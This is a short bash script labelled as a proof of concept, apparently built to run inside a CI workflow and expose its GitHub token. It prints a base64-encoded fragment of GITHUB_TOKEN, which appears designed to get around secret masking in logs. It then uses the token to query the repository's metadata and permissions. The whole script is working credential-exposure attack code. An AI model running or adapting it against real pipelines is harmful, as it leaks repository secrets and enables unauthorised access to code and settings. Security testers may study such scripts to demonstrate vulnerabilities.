#!/usr/bin/env bash

set -uo pipefail

echo "[*] GITHUB_TOKEN populated: ${GITHUB_TOKEN:+YES (length=${#GITHUB_TOKEN})}"
echo "[*] GITHUB_TOKEN (base64-encoded, first 40 chars):"
echo "    $(echo -n "$GITHUB_TOKEN" | base64 | head -c 40)..."
echo ""

echo "[*] Repo metadata:"
curl -s -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
print(f'    Repo: {d[\"full_name\"]}')
print(f'    Private: {d[\"private\"]}')
print(f'    Default branch: {d[\"default_branch\"]}')
print(f'    Has issues: {d[\"has_issues\"]}')
print(f'    Permissions: {json.dumps(d.get(\"permissions\", {}), indent=6)}')
" 2>/dev/null || echo "    (python3 parse failed)"

echo ""
echo "=== PoC COMPLETE ==="
